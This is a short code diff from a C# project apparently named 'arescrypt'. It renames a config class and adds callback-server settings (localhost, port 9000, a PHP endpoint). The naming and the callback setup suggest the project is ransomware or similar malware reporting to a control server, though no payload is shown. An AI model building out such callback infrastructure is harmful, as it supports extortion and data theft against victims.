@@ -22,11 +22,13 @@
         // DAT file configuration
         public string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
         // Variables to be set by GetDATFileData()
-
-        public string uniqueKey { get; set; }
+        // Server Data
+        public static string callbackServer = "localhost";
+        public static int callbackPort = 9000;
+        public static string callbackURL = "http://" + callbackServer + "/arescrypt.php";
     }
 
-    class Config
+    class ServerData
     {
         public string uniqueKey { get; set; }
     }
